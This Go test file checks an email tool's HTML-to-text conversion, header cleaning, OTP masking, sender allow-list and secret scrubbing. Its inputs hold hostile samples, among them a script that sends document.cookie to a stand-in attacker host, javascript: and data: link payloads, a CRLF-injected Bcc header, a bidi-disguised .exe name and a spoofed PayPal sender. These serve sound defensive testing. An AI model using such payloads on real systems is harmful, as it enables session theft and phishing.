package main

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestHTMLToText(t *testing.T) {
	in := `<!doctype html><html><head><title>Hi</title><style>body{background:url(https://evil.example/x)}</style>
<script>document.location="https://evil.example/"+document.cookie</script></head><body>
<noscript>enable js</noscript><template><p>hidden template</p></template>
<iframe src="https://evil.example/frame">frame text</iframe><object data="x.swf">object text</object>
<h1>Hello &amp; welcome</h1>
<p>Fish&nbsp;&amp;&nbsp;chips &lt;b&gt;not bold&lt;/b&gt; &#8364;5</p>
<p><a href="javascript:alert(1)">Click me</a> <a href="JaVa&#x09;ScRiPt:alert(2)">Tabbed</a>
<a href=" data:text/html;base64,PHNjcmlwdD4=">Data</a> <a href="  https://real.example/path?q=1  ">Real link</a>
<a href="https://evil.example/a b<c>">Odd</a> <a href="#top">Top</a></p>
<img src="https://tracker.example/pixel.gif" alt="Company &quot;logo&quot;"><img src="cid:x">
<ul><li>one</li><li>two</li></ul>
<div>a</div><div>b</div>line<br>break
</body></html>`
	out := htmlToText(in)
	for _, want := range []string{
		"Hello & welcome",
		"Fish & chips <b>not bold</b> €5", // entities decoded, as text
		"Click me <link removed>",
		"Tabbed <link removed>",
		"Data <link removed>",
		"Real link <https://real.example/path?q=1>",
		"Odd <https://evil.example/a%20b%3Cc%3E>",
		"Top",
		"[image: Company \"logo\"] [image]",
		"- one\n- two",
		"a\nb\nline\nbreak",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	for _, bad := range []string{"document", "evil.example/x", "evil.example/\"", "enable js", "hidden template", "frame text",
		"object text", "tracker.example", "alert", "PHNjcmlwdD4", "<p>", "<script", "Hi\n"} {
		if strings.Contains(out, bad) {
			t.Errorf("has %q:\n%s", bad, out)
		}
	}
}

func TestCleanHeaders(t *testing.T) {
	// A malicious subject and sender name: newlines, bidi overrides,
	// markup and a fake address in the display name.
	raw := "From: =?utf-8?q?PayPal_=3Csecurity=40paypal=2Ecom=3E=E2=80=AE?= <evil@x.example>\r\n" +
		"To: pip@example.org\r\n" +
		"Subject: =?utf-8?b?" + b64("Urgent\r\nBcc: all@x.example <script>alert(1)</script>\u202egnp.exe") + "?=\r\n" +
		"Message-ID: <a@x.example>\r\n" +
		"Content-Type: text/plain; charset=iso-8859-1\r\n" +
		"Content-Transfer-Encoding: quoted-printable\r\n\r\n" +
		"Caf=E9 =1B[31mred=1B[0m line\r\n"
	m, _, err := parseRaw([]byte(raw), "")
	if err != nil {
		t.Fatal(err)
	}
	if m.From.Email != "evil@x.example" || strings.ContainsAny(m.From.Name, "<>\"\u202e") {
		t.Errorf("from: %+v", m.From)
	}
	if got := m.From.String(); got != "PayPal security@paypal.com <evil@x.example>" {
		t.Errorf("from string: %q", got)
	}
	if strings.ContainsAny(m.Subject, "\r\n\u202e") || !strings.Contains(m.Subject, "<script>") {
		t.Errorf("subject: %q", m.Subject) // markup stays as plain text; JSON carries it inert
	}
	if m.Text != "Café [31mred[0m line" {
		t.Errorf("text: %q", m.Text)
	}
}

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

func TestMIMEPrefersPlain(t *testing.T) {
	raw := "From: a@x.example\r\nSubject: s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=X\r\n\r\n" +
		"--X\r\nContent-Type: multipart/alternative; boundary=Y\r\n\r\n" +
		"--Y\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: base64\r\n\r\n" + b64("plain wins") + "\r\n" +
		"--Y\r\nContent-Type: text/html\r\n\r\n<p>html loses</p>\r\n--Y--\r\n" +
		"--X\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=\"a.pdf\"\r\n\r\n%PDF\r\n--X--\r\n"
	m, data, err := parseRaw([]byte(raw), "1")
	if err != nil {
		t.Fatal(err)
	}
	if m.Text != "plain wins" || len(m.AttachmentList) != 1 || m.AttachmentList[0].Type != "application/pdf" || string(data) != "%PDF" {
		t.Fatalf("%+v %q", m, data)
	}
}

func TestOTP(t *testing.T) {
	cases := []struct {
		subject, text string
		hidden        []string
		kept          []string
	}{
		{"Your code", "Use 123456 to sign in.", []string{"123456"}, nil},
		{"Welcome", "Your verification code: 4821. Don't share it.", []string{"4821"}, nil},
		{"Sign in", "Your one-time passcode is 98765432", []string{"98765432"}, nil},
		{"2FA", "Code 123 456", []string{"123 456"}, nil},
		{"Login", "security code\n\n  555123  \n", []string{"555123"}, nil},
		{"Invoice 2026", "Order 123456 shipped. Call 555-1234 today.", nil, []string{"123456", "555-1234"}},
		{"Hello", "Your OTP is 12345. Call us at 555-1234-5678 about code reviews.", []string{"12345"}, []string{"555-1234-5678"}},
		{"Your verification code is 739201", "", []string{"739201"}, nil},
	}
	for _, c := range cases {
		text, found := maskOTP(c.subject, c.text)
		subj := maskSubject(c.subject)
		all := subj + " " + text
		if found != (len(c.hidden) > 0) {
			t.Errorf("%q/%q: found=%v", c.subject, c.text, found)
		}
		for _, h := range c.hidden {
			if strings.Contains(all, h) || !strings.Contains(all, otpHidden) {
				t.Errorf("%q not hidden: %q", h, all)
			}
		}
		for _, k := range c.kept {
			if !strings.Contains(all, k) {
				t.Errorf("%q hidden wrongly: %q", k, all)
			}
		}
	}
}

func TestAllowed(t *testing.T) {
	allow := []string{"Shop@Vendor.example", "@partner.example"}
	for addr, want := range map[string]bool{
		"shop@vendor.example": true, "SHOP@VENDOR.EXAMPLE": true, "other@vendor.example": false,
		"a@partner.example": true, "a@sub.partner.example": false, "a@partner.example.evil": false,
		"partner.example": false, "": false,
	} {
		if got := allowed(addr, allow); got != want {
			t.Errorf("allowed(%q) = %v", addr, got)
		}
	}
}

func TestScrub(t *testing.T) {
	c := AccountConfig{Username: "pip", Password: "hunter22-secret"}
	got := c.scrub(errString("login hunter22-secret failed; header Basic cGlwOmh1bnRlcjIyLXNlY3JldA=="))
	if strings.Contains(got, "hunter22") || strings.Contains(got, "cGlwOmh1bnRlcjIyLXNlY3JldA") {
		t.Fatal(got)
	}
}

type errString string

func (e errString) Error() string { return string(e) }
